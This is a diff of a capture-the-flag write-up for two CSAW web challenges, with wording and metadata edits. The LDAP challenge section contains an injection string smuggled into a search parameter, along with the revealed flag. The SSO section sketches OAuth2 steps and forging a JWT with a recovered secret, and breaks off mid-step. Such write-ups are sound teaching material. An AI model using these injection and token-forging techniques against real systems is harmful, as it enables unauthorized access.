@@ -2,39 +2,40 @@
 
 # Ldab
 
-Difficulty: **★☆☆☆☆**
+Points : 50
 
 Sovled: **432 / 1448**
 
-Tag: **Blackbox, Ldap injection**
+Tags: **Blind, Ldap injection**
 
 Link: **http://web.chal.csaw.io:8080**
 
-**Idea**
+**How to solve ?**
 - Search for list all of all users and groups 
 
 **Solution**
-1. Payload ldap injection [here](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/LDAP%20injection)
-2. Request `/index.php?search=*)(uid=*))(|(uid=*`
+1. Check for LDAP injection payloads [here](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/LDAP%20injection)
+2. Request `http://web.chal.csaw.io:8080/index.php?search=*))(|(GivenName=*)(UID=*`
 3. Flag `flag{ld4p_inj3ction_i5_a_th1ng}`
 
 <a name="sso"/>
 
 # SSO
 
-Difficulty: **★★★☆☆**
+Points: 100
 
-Sovled: **210 / 1448**
+Sovled: **210 / 1448
+How to solve ?**
 
-Tag: **Blackbox, oauth2, sigle sign on, JWT token**
+Tags: **Blackbox, Oauth2, Signle Sign On, JWT token**
 
 Link: **web.chal.csaw.io:9000**
 
-**Idea**
-- Use oauth 2.0 for authentication and request the resources
-- Crack signature jwt for get flag
+**Steps to solve :**
+- Use oauth 2.0 for authorization and authentication
+- Get the secret to forge a valid JWT token and get the flag
 
-**Solution**
+**Solution :**
 1. Get code authorization: `/oauth2/authorize`
  - response_type: `code`
  - redirect_uri: `http://web.chal.csaw.io:9000/protected`
